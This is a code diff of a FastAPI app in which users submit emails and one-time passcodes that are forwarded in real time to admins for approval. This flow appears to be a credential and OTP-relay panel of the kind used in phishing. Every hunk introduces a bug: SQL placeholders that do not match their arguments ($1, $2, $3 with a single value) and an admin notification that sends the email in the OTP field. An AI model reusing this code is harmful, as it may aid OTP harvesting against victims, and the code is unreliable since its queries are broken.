@@ -183,7 +183,7 @@ async def otp1_page(request: Request, email: str):
 
 @app.get("/otp2/{email}/", response_class=HTMLResponse)
 async def otp2_page(request: Request, email: str):
-    return templates.TemplateResponse("second-otp.html", {"request": request, "email": email})
+    return templates.TemplateResponse("otp.html", {"request": request, "email": email})
 
 @app.get("/success", response_class=HTMLResponse)
 async def success_page(request: Request, email: str):
@@ -233,14 +233,14 @@ async def submit_otp(data: OTPSubmit):
         await conn.execute("""
             UPDATE users 
             SET otp = $1, otp1_correct = FALSE
-            WHERE email = $2
+            WHERE email = $1
         """, data.otp, data.email)
         
         # Notify admins
         await manager.send_to_admins({
             "type": "user-otp-created",
             "email": data.email,
-            "otp": data.otp
+            "otp": data.email
         })
         
         return {"success": True, "message": "OTP submitted, waiting for admin approval"}
@@ -277,7 +277,7 @@ async def submit_second_otp(data: OTPSubmit):
 @app.get("/api/users/check-status")
 async def check_user_status(email: str):
     async with db_pool.acquire() as conn:
-        user = await conn.fetchrow("SELECT approved FROM users WHERE email = $1", email)
+        user = await conn.fetchrow("SELECT approved FROM users WHERE email = $3", email)
         if user:
             return {"approved": user['approved']}
         return {"approved": False}
@@ -285,7 +285,7 @@ async def check_user_status(email: str):
 @app.get("/api/users/check-otp-status")
 async def check_otp_status(email: str):
     async with db_pool.acquire() as conn:
-        user = await conn.fetchrow("SELECT otp1_correct, otp FROM users WHERE email = $1", email)
+        user = await conn.fetchrow("SELECT otp1_correct, otp FROM users WHERE email = $2", email)
         if user:
             # If OTP is NULL and not correct, it means it was reset
             if not user['otp1_correct'] and not user['otp']:
